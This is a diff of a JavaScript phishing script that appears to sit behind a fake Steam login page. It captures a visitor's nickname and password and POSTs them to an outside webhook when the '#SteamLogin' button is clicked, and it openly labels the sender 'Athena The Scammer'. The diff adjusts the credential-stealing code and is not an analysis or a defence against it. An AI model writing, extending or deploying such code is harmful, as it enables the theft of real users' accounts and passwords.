@@ -17,12 +17,12 @@ async function send_data() {
   }
 
   const payload  = {
-    username: "ScamBoi",
+    username: "Athena The Scammer",
     content: `Nickname: ${username}\nPassword: ${password}`
   }
 
   try {
-    const res = await fetch( webhook, 
+    const res = await fetch(webhook, 
     {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -49,7 +49,7 @@ async function send_data() {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-  const btn = document.querySelector('.submit');
+  const btn = document.querySelector('#SteamLogin');
   if (btn) 
     {
         btn.addEventListener('click', send_data);
